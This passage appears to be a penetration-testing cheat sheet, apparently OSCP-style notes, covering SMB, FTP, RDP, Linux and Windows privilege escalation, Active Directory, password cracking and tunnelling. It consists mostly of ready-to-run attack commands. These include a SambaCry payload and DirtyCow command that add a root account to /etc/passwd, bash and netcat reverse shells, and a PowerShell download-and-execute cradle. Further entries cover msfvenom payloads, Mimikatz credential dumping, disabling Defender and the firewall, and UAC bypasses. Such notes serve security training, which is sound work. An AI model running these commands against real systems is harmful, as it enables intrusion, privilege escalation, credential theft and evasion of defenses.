    - `impacket-psexec {username}:{password}'@{ip}`
- Check version
    - `nmap -p139,445 --script smb-os-discovery -Pn {IP}`
    - Open Wireshark
        - `smbclient -N -L "//{IP}/" --option='client min protocol=nt1'`
    - msf
        - `scanner/smb/smb_version`
- CVE-2017-7494 SambaCry , linux/samba/is_known_pipename
    - Check vuln
        - `nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 -Pn {IP}`
    - Check share dir
        - `nmap --script=smb-enum-shares -p445 -Pn {IP}`
    - https://github.com/joxeankoret/CVE-2017-7494
        - `python2 cve_2017_7494.py -t 10.11.1.146 --custom command.so`
    - `gcc -o command.so -shared command.c -fPIC`
        - ```C=
          #include <stdio.h>
          #include <unistd.h>
          #include <netinet/in.h>
          #include <sys/types.h>
          #include <sys/socket.h>
          #include <stdlib.h>
          #include <sys/stat.h>
          int samba_init_module(void)
            {
              setresuid(0,0,0); 
              system("echo root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash >> /etc/passwd");
              return 0;
            }
          ```
- List user
    - `nmap --script smb-enum-users.nse -p445 {IP}`
- Low Version
    - `--option='client min protocol=nt1'`
        - If got `NT_STATUS_CONNECTION_DISCONNECTED`
- Symlink Directory Traversal ( < 3.4.5)
    - Tested on 3.0.24
    - https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually
- Samba 2.2.x - Remote Buffer Overflow
    - Tested on 2.2.7a
    - https://www.exploit-db.com/exploits/7
- Scan
    - `python3 enum4linux-ng.py -A {IP}`
### Pop3
- `nmap -Pn --script "pop3-capabilities or pop3-ntlm-info" -sV -p{PORT}`
- Dump
    - `PGPASSWORD="{PASSWORD}" pg_dump {DB_NAME} > test.dump`
### FTP
- Home FTP
    - [Home FTP Server 1.12 - Directory Traversal](https://www.exploit-db.com/exploits/16259)
    - [Home FTP File Download](https://webcache.googleusercontent.com/search?q=cache:92M05_e2PYcJ:https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0911-exploits/homeftpserver-traversal.txt+&cd=4&hl=zh-TW&ct=clnk&gl=tw&client=firefox-b-d)
- FileZilla
    - Default password location
        - `C:\Program Files\FileZilla Server\FileZilla Server.xml`
        - maybe `(x86)`
- WINRM (5985 port)
    - `sudo gem install evil-winrm`
    - `evil-winrm -t {IP} -u {User} -p {pass}`
### RDP
- Enable
    - `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
    - `netsh advfirewall firewall set rule group="remote desktop" new enable=yes`
- Add User To RDP Group
    - `net localgroup "Remote Desktop Users" "{USER_NAME}" /add`
## Privilege - Linux
### Kernel Exploit
- [CVE-2017-16995](https://github.com/rlarabee/exploits/tree/master/cve-2017-16995)
    - Test on Kernel 4.4.0 (4.4.0-116-generic)
    - `gcc cve-2017-16995.c -o cve-2017-16995`
- [CVE-2012-0056 (memodipper)](https://github.com/lucyoa/kernel-exploits/blob/master/memodipper/memodipper.c)
    - `gcc memodipper.c -o m.out`
- [CVE-2010-2959 (i-can-haz-modharden)](https://raw.githubusercontent.com/macubergeek/ctf/master/privilege%20escalation/i-can-haz-modharden.c)
- Compile for old OS
    - `gcc -m32 ./{INPUT.c) -o {OUTPUT} -Wl,--hash-style=both`
    - `-static`
- CVE-2021-4034 (pkexec) (pwnkit)
    - https://haxx.in/files/blasty-vs-pkexec.c
        - `gcc blasty-vs-pkexec.c -o meow`
        - `source <(wget https://raw.githubusercontent.com/azminawwar/CVE-2021-4034/main/exploit.sh -O -)`
    - https://github.com/ly4k/PwnKit/raw/main/PwnKit
        - `chmod +x ./PwnKit`
        - `./PwnKit`
- [CVE-2016-5195 (dirtycow)](https://www.exploit-db.com/download/40611)
    - ```
      gcc -pthread 40611.c -o dirtyc0w
      ./dirtyc0w /etc/passwd "root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash
      "
      ```
- [CVE-2015-1328 (overlayfs)](https://www.exploit-db.com/download/37292)
    - Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15
    - `gcc ofs.c -o ofs`
    - `./ofs`
- lxd group
    - `id` -> user has lxd group
    - `wget https://github.com/saghul/lxd-alpine-builder/raw/master/alpine-v3.13-x86_64-20210218_0139.tar.gz -O alpine.tar.gz`
    - `lxc image import alpine.tar.gz --alias alpine`
    - `lxc init alpine privesc -c security.privileged=true`
    - `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
    - `lxc start privesc`
    - `lxc exec privesc /bin/sh`
    - `cd /mnt/root ....`
    
### Software
- [GTFOBins](https://gtfobins.github.io/)
    - Linux privileges escalation 
- [Pspy](https://github.com/DominicBreuker/pspy)
    - Monitor the process
#### Enumeration
Scan the system to find which can be use for privileges escalation
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LSE](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux-Exploit-Suggester (LES)](https://github.com/mzet-/linux-exploit-suggester)
### Tips
- Writable `/etc/passwd`
    - Append `root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash` to file
        - `root1` : `meow`
    - Generate hash : `openssl passwd {PASSWORD}`
- Add User
    - `useradd -p $(openssl passwd -1 meow) root1`
- Add to sudo group
    - `usermod -aG sudo root1`
### Program Hijack
#### Python
- import library priority
	1. local file
	2. `python -c "import sys;print(sys.path)"`
- Check file permission if it can be write 
- Fake library file
	```python
	import pty
	pty.spawn("/bin/bash")
	```
#### Bash
- Relative path is from `$PATH`
	- We can modify this by
		- `PATH=/my/fake/path:$PATH ./binary`
	- Fake path can contain the shell/reverse shell command file
### IP Tables
- Clear all rull
```bash
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F
iptables -X
```
- Check open port
    - `netstat -tulpn | grep LISTEN`
### Program
- `tar` Wildcard
	- `echo "bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'" > shell.sh`
	- `chmod 777 shell.sh`
	- `echo "" > "--checkpoint-action=exec=sh shell.sh"`
	- `echo "" > --checkpoint=1`
	- `tar cf archive.tar *`
### Capability
- If the program has some special capability
	- https://man7.org/linux/man-pages/man7/capabilities.7.html
	- `CAP_SETUID`
- Can do with [GTFOBins](https://gtfobins.github.io/)
###  Doas
- `doas.conf`
	- if exist `permit nopass {user} as {root} cmd {binary}`
	- We can `doas {binary}` and it will run as root
### SSH `authorized_keys` Brute force
- `/var/backups/ssh/authorized_keys` or `~/.ssh/authorized_keys`
- https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process
    - `git clone https://github.com/g0tmi1k/debian-ssh`
    - `tar vjxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2`
    - `cd debian-ssh/common_keys/dsa/1024/`
    - `grep -lr '{keys}'`
    - Find the file name without `.pub` is secret key
### Docker
- `/.dockerenv`
	- If exist, probably in docker 
- Notice mount point
- Mount data `/proc/1/mountinfo` , `/proc/self/mounts` (LFI can read)
### SOP
- Check `sudo -l`
	- What file we can run as super user 
- Check crontab
    - `cat /etc/crontab `
	- With LinEnum, LinPeas
	- PsPy check
- Check SUID / SGID
    - `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
    - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
    - With [GTFOBins](https://gtfobins.github.io/)
- Check sudo version
	- [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
		- sudo < 1.8.28
		- `sudo -u#-1 binary`
    - [CVE-2010-0426](https://github.com/t0kx/privesc-CVE-2010-0426) Sudo 1.6.x <= 1.6.9p21 and 1.7.x <= 1.7.2p4
        - sudoedit 
- Check $PATH / import library permission
	- Program Hijack
- Check capability
    - `getcap -r / 2>/dev/null`
	- Check if the program has some useful capability
- Check backup file
## Privilege - Windows
### XP
- [Windows XP SP0/SP1 Privilege Escalation to System](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
### Exploit
- https://github.com/SecWiki/windows-kernel-exploits
- [EternalBlue MS17-010](https://github.com/helviojunior/MS17-010)
    - Prepare msf reverse shell exe
    - run `send_and_execute.py` 
        - Maybe need to change username to `guest`
    - If can't reply some port
        - use `zzz_exploit.py` , change `smb_pwn`  function 
        - `service_exec(conn,r'cmd /c net user /add meow Me0www')` 
        - `service_exec(conn,r'cmd /c net localgroup administrators meow /add')`
- [Cerrudo](https://github.com/Re4son/Churrasco)
    - Windows Server 2003
- [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip)
    - `ms15-051x64.exe whoami`
- [JuicyPotato x64](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) , [x86](https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe)
    - User have `SeImpersonate` or `SeAssignPrimaryToken` by `whoami /priv`
    - `JuicyPotato.exe -l 1337 -p shell7878.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`
        - `-c` (Include curly brackets)
            - CLSID from https://ohpe.it/juicy-potato/CLSID/
        - `-p` Exe Program 
        - Not work for Windows Server 2019 and Windows 10 versions 1809 and higher.
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
    - Windows Server 2019 and Windows10
    - `SeImpersonatePrivilege` Enable 
    - `PrintSpoofer.exe -i -c cmd`
- [XP SP0 \~ SP1](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
    -  `net start SSDPSRV`
    -  `sc config SSDPSRV start= auto`
    -  `sc qc SSDPSRV`
    -  `net start SSDPSRV`
    -  `sc config upnphost binpath= "C:\{abs_path_for_reverse_shell_exe}`
    -  `sc config upnphost obj= ".\LocalSystem" password= ""`
    -  `sc qc upnphost`
    -  `net start upnphost`
### Bypass UAC
- [CVE-2019-1388](http://blog.leanote.com/post/snowming/38069f423c76)
- [CMSTP UAC Bypass](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)
    - `Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"`
    - `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))`
    - `[CMSTPBypass]::Execute("C:\Users\Batman\tshd_windows_amd64.exe -c 10.10.10.10 -p 8787")`
### Bypass CLM
- IF powershell `$ExecutionContext.SessionState.LanguageMode` return `ConstrainedLanguage` = Constrained Language Mode, CLM ; `FullLanguage` = No Limit
- Meterperter
    - `load powershell`
    - `powershell_shell`
    - `$ExecutionContext.SessionState.LanguageMode` -> should return `FullLanguage`
### Registry
- AlwaysInstallElevated
    - If both set to 1
        - `reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
        - `reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
    - Can install file with
        - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={Port} -f msi -o shellx64.msi`
        - `msiexec /quiet /i shellx64.msi`
    - But need to check where can install (AppLocker)
        - `Get-AppLockerOolicy -Effective | Select -Expandproperty RuleCollections`
- Auto login
    - `reg query HKCU\Software\Microsoft\Windows NT\Currentversion\WinLogon /v DefaultUserName`
    - `reg query HKCU\Software\Microsoft\Windows NT\Currentversion\WinLogon /v DefaultPassword`
### Defender / Firewall
- 64 bit Powershell
	- `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
-  Disable Realtime Monitoring 
	-  `Set-MpPreference -DisableRealtimeMonitoring $true`
-  Uninstall Defender
	-  `Uninstall-WindowsFeature -Name Windows-Defender –whatif`
	-  `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
-  Turn off firewall
	- `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
- Check Defender Status
    - `powershell -c Get-MpComputerStatus`
        - Check `AntivirusEnabled` is `True` or `False`
### Check vulnerability
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
	- `systeminfo`
		- Run in target machine and save to txt file
    - Dependency
        - `pip install xlrd==1.2.0`
	- `windows-exploit-suggester.py --update`
		- Get new database
	- `windows-exploit-suggester.py --database {Database file} --systeminfo {systeminfofile}`
- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
	- `systeminfo`
	- `python3 wesng.py --update`
	- `python3 wesng.py {systeminfofile}`
### Sensitive data
- PowerShell History Path
	- `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt `
- User Home
    - Desktop
    - Document
    - Download
- `C:\Windows\System32\drivers\etc\hosts`
### Process
- `netstat -ano`
    - Open Port
    - `netstat -an | findstr "LISTENING"`
- `tasklist`
    - like ps
    - `/v` : list user
### Services
- Query Services
    - `sc qc {Services Name}`
    - Can get the services user
- Get all services
    - `wmic service get name,pathname`
### Permission
- `icacls`
    - Check permission
    - `/reset` reset the permission to their parent
- [cpau](https://www.joeware.net/freetools/tools/cpau/index.htm)
    - `cpau -u {user_name} -p {password} -ex C:\{abs_exe_path} -LWP`
    - Run command with given username and password.
- Powershell Invoke-Command
```powershell
$username = 'USER_NAME'
$password = 'PASSWORD'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-command -computername COMPUTER_NAME -credential $credential -scriptblock {cmd.exe /c C:\Users\Public\nc.exe -e cmd.exe 10.1.1.1
5 8877 }
```
- Administrator to System
    - It is a feature
        - `PsExec -i -s cmd.exe`
            - Will creat a new window
        - `PsExec -s cmd`
            - In current window
        - `-accepteula`
        - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
### User
- Create new user
    - `net user /add {USER_NAME} {USER_PASS}`
- Add user to admin group
    - `net localgroup administrators {USER_NAME} /add`
### AD
- List user
    - `net user` Machine
    - `net user /domain` AD
    - `net user {Username} /domain` list user detail
- List group
    - `net group`
    - `net group /domain`
- http://md.stevenyu.tw/zeDGpHb-RVSi0K5xF1HRsQ
#### Kerberoast
- Get User Hash
    - [Invoke-Kerberoast.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
    - `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://{MY_IP}/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"`
    - `hashcat -m 13100 `
### Get User's hash
- `impacket-smbserver`
    - `dir \\{ip}\meow`
    - Get NETNTLMv2
    - Use john to crack!
- Dump `sam` / `system`
    - reg
        - `reg save hklm\sam c:\sam`
        - `reg save hklm\system c:\system`
    - `fgdump.exe` (`locate fgdump.exe`)
        - Send to windows and just run
        - It will create a `127.0.0.1.pwdump` hash file
    - `hashcat -m 1000`
- [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)
    - `privilege::debug`
    - `sekurlsa::logonPasswords full`
        - Dump current computer passwords
    - `lsadump::dcsync /domain:{DOMAIN NAME} /all /csv`
        - Dump domain user hash (need domain admin)
    - `mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"`
### Powershell
- If got `cannot be loaded because running scripts is disabled on this system`
    - type `Set-ExecutionPolicy RemoteSigned`
### Defense Evasion
- Shellter
    - Auto Mode : A
    - PE Target : `{whoami.exe}`
    - Stealth mode : N
    - Custom : C
    - Payload : `{raw_file}`
        - `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f raw > {FILE}.raw`
    - DLL Loader : N
- GreatSCT
    - Must run in x86 kali
    - `use Bypass`
    - `msbuild/meterpreter/rev_tcp.py`
    - `SET LHOST {IP}`
    - `SET LPORT {PORT}`
    - `generate`
    - Get payload xml (Default : `/usr/share/greatsct-output/source/`)
    - `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe {PATH OF XML}`
## Password Crack
### Software
- Hydra
    - Crack online services password
        - SMB,SSH,FTP......
    - Usage
        - ssh
            - `hydra -l {username} -P {path_to_wordlist} ssh://{ip_address}`
        - http{s} Post
            - `hydra -l {username} -P {path_to_wordlist} {domain_name_without http/s} http{s}-post-form "{/{path}}:username=^USER^&password=^PASS^&data=data:{string_if_fail}"`
        - ftp
            - `hydra -l {username} -P {wordlist} ftp://{IP}`
- Cowbar
    -  `crowbar -b rdp -s {IP}/32 -U {User List} -C {Password List}`
- John the ripper
    - Crack hash like `/etc/shadow`
    - Support tools
        - [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
        - gpg2john
        - zip2john
        - samdump2
        	- NTLM 2 John
        	- `samdump2 system sam > j.txt`
    - Usage
        - `john {file} --wordlist={wordlist}`
- Hashcat
    - Crack hash 
        - https://hashcat.net/wiki/doku.php?id=example_hashes
    - `hashcat -m {mode} {hashes.txt} {wordlist.txt}`
- LUKS
    - `bruteforce-luks -t 10 -f wordlist.txt -v 5 backup.img`
    - `sudo cryptsetup open --type luks backup.img {mount_name}`
    - `sudo mount /dev/mapper/{mount_name} mount_point`
### Dictionary
- rockyou.txt
- https://github.com/danielmiessler/SecLists
	- [xato-net-10-million-passwords-dup.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-dup.txt)
- Apache Tomcat
    - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
    - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
- Generate Wordlist
    - Cewl
        - `cewl http://{IP}/{PATH} | tee wordlist.txt`
### Online
- https://crackstation.net/
- https://hashes.com/en/decrypt/hash

## Software
- RDP
	- `xfreerdp +drives /u:{username} /p:{password} /v:{ip}:{port}`
	    - `/size:1800x1000`
	    - `/u:{domain\username}`
- FTP
	- `ls`
	- `get {file_name}`
	- `put {file_name}`
	- Download recursive 
	    - `wget -r 'ftp://{ip}/{path}/'`
- Unzip
    - `.gz`
        - `gunzip  {filename.gz}`
- tcpdump
    - Recv icmp : `sudo tcpdump -i tun0 icmp`
    - Capture package : `tcpdump -i {interface} -s 65535 -w {file.pcap}`
- SSH
    - No matching host key type found. Their offer `...`
        - `ssh -o HostKeyAlgorithms=+{ssh-rsa}`
    - No matching key exchange method found. Their offer `...`
        - `ssh -o KexAlgorithms=+{diffie-hellman-group1-sha1}`
    - No matching cipher found. Their offer `...`
        - `ssh -o Ciphers=+{aes128-cbc}`
- Zip Path Traversal 
    - e.g. ATutor 2.2.1 Directory Traversal
```python
from io import BytesIO
import zipfile

f = BytesIO()
z = zipfile.ZipFile(f,'w',zipfile.ZIP_DEFLATED)
z.writestr('../../../../../../../tmp/meow','meowmeow')
z.close()

with open('poc.zip','wb') as fi:
    fi.write(f.getvalue())
```
### Reverse tunnel forwarding
- https://book.hacktricks.xyz/tunneling-and-port-forwarding
- [Chisel](https://github.com/jpillora/chisel) 
    - Port
        - Server : `./chisel server -p {listen_port} --reverse`
            - listen port can be random
        - Client : `./chisel client {Remote_host}:{listen_port} R:{forward_port_at_attacker}:127.0.0.1:{forward_port}`
        - eg. : Remote server run a program at `127.0.0.1:8888`,we need to forward to our attack machine's `127.0.0.1:8888`
            - `./chisel server -p 9999 --reverse`
            - `./chisel client 10.10.16.35:9999 R:8888:127.0.0.1:8888`
    - Proxy
        - Server `./chisel server -p {listen_port} --reverse`
        - Client `./chisel client {Remote_host}:{listen_port} R:socks`
        - Default proxy port : 1080 (sock5)
            - Set `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf` or firefox proxy
        - Change proxy port to 9487
            - Turn last statement to `R:9487:socks` 
- SSH
    - Port Forwarding
        - `ssh -L {forward_port}:127.0.0.1:{forward_port} {remote_user}@{remote_ip} -p {ssh_port} -N -v -v`
            - Run in local
            - eg : Remote `10.87.87.87` run `5555` in remote local, open `2222` port for ssh, we can use following command to forward `5555` to our local `5555`
                - `ssh -L 5555:127.0.0.1:5555 demo@10.87.87.87 -p 2222 -N -v -v`
    - Proxy
        - `ssh -D 127.0.0.1:{PORT} {USER}@{IP}`
        - socks4, can set to proxychains
- nc
    - Suppose 192.168.5.2:987 is ssh, and can only accept 53 port
        - `ncat -l 1234 --sh-exec 'ncat 192.168.5.2 987 -p 53'`
            - `-p 53` means use 53 port to send the data
        - `ssh user@127.0.0.1 -p 1234`
## Forensics
- Unknown files
	- `file {file_name}`
	- `binwalk {file_name}`
	    - Extract squashfs patch
	        - `git clone https://github.com/threadexio/sasquatch`
            - `./build.sh`
        - `-e` Extract
	- `xxd {file_name}`
	- `foremost {file_name}`
- dd
    - `dd if={input_file} bs=1 skip={skip_offset} of={outfile}`
### Steganography
- [stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
- [zsteg](https://github.com/zed-0xff/zsteg)
- [steghide](http://steghide.sourceforge.net/)
	- `steghide extract -sf {file_name}`
- exiftool

<!-- TODO:
https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html
-->